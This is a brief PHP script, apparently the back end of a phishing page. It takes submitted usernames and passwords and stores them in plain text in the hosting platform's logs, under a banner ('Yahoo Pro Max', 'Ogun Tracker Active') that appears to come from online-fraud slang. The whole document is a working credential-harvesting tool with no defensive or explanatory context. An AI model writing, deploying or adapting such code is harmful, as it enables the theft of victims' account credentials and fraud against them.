<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $log = "🔥 Yahoo Pro Max 🔥\nUsername: $username | Password: $password\n";

    // Railway Logs Storage 🔥
    error_log($log);

    echo "Ogun Tracker Active ✅";
}
?>
